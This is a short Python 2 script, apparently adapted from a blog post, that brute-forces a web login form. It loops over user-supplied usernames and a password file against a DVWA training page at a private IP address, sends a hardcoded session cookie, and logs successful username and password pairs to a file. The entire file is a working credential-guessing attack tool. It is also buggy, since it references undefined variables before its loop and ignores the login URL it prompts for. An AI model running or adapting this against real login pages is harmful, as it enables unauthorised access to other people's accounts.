#!/usr/bin/python
#Original Creator:http://t3rm1t.blogspot.com/2012/08/bruteforce-http-form-with-hydra-and.html
#Highly Edited By Paradox Technologies!



import os,sys,urllib2





def httpBruteForce():
    #Get Info Needed:
    users = raw_input("User/User's | Example Format: User1, User2, User3\n> ")
    passlistPath = open(raw_input("Path To Pass List: Default: C:\...\lib\BruteForce\default.txt\n> "), 'r+')
    passwords = passlistPath.read().split("\n")
    passlistPath.close()

    print "Trying  %s : %s" % (user, password)
    print ("Login url Example: http://10.10.1.10/dvwa/vulnerabilities/brute/index.php?username=%s&password=%s&Login=Login" ,
    "\nGo to the httpBrute Help Section For More Information" + "\n"*2)
    print "Login url: \n>"
    loginURL = raw_input(">")
    url = "http://10.10.1.10/dvwa/vulnerabilities/brute/index.php?username=%s&password=%s&Login=Login" %(user, password)


    #Lets get down and dirty:
    for user in users:
        for password in passwords:
            print "Trying  %s : %s" % (user, password)
            url = "http://10.10.1.10/dvwa/vulnerabilities/brute/index.php?username=%s&password=%s&Login=Login" %(user, password)
            req = urllib2.Request(url)
            req.add_header("Cookie", "security=low; PHPSESSID=k73vfi85vvna3mchopebmcgc43")
            response = urllib2.urlopen(req)
            html = response.read()
            #Print and write into a file successful attempts
            if "Username and/or password incorrect." not in html:
                print "Login : Password are  %s : %s" %(user, password)
                pas = open('done.txt','a')
                pas.write('%s : %s \n' %(user,password))
                print "Valid Password And User Combination: " + user + " " + password
                pas.close()

